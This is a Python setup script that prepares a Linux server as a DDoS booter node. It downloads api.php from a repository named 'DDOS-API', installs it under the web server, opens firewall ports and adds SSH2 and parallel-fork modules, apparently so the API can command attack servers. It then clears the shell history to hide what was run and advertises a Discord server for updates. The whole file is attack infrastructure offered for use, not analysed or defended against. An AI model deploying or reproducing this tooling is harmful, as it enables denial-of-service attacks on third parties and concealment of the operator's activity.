import subprocess
import time
import requests

# Decoded strings
important = 'Created By @slippersyo and @dirtystress'
apidl = 'https://raw.githubusercontent.com/samual1337/DDOS-API/master/api.php'
discord = 'https://discord.gg/j964XYu'

# Download API using requests
try:
    response = requests.get(apidl)
    if response.status_code == 200:
        with open('api.php', 'wb') as f:
            f.write(response.content)
    else:
        print("Failed to download API.")
except Exception as e:
    print("Error downloading API:", e)
    exit()

# Print important message
print(important)
print('All updated files are dropped in the discord server:', discord)

# Prepare node
print('Preparing Node...')
time.sleep(1)

# Install packages and configure firewall
try:
    subprocess.run(['yum', 'install', 'python3-requests', 'php', 'screen', 'httpd', '-y'], check=True)
    subprocess.run(['mv', 'api.php', '/var/www/html'], check=True)
    subprocess.run(['firewall-cmd', '--zone=public', '--add-port=80/tcp', '--permanent'], check=True)
    subprocess.run(['firewall-cmd', '--zone=public', '--add-port=443/tcp', '--permanent'], check=True)
    subprocess.run(['firewall-cmd', '--reload'], check=True)
except subprocess.CalledProcessError as e:
    print("Error installing packages or configuring firewall:", e)
    exit()

# Install and configure SSH2
print('Making Sure SSH2 Works...')
try:
    subprocess.run(['yum', 'install', 'gcc', 'cpan', 'php-pear', 'php-devel', 'libssh2', 'libssh2-devel', '-y'], check=True)
    subprocess.run(['pecl', 'install', '-f', 'ssh2'], check=True)
    with open('/etc/php.d/ssh2.ini', 'w') as f:
        f.write('extension=ssh2.so')
    subprocess.run(['cpan', '-fi', 'Net::SSH2'], check=True)
    subprocess.run(['cpan', '-fi', 'Parallel::ForkManager'], check=True)
except subprocess.CalledProcessError as e:
    print("Error installing or configuring SSH2:", e)
    exit()

# Clean up
subprocess.run(['history', '-c'], check=True)
subprocess.run(['clear'])

print('Finished!')
input('Press ENTER to exit')
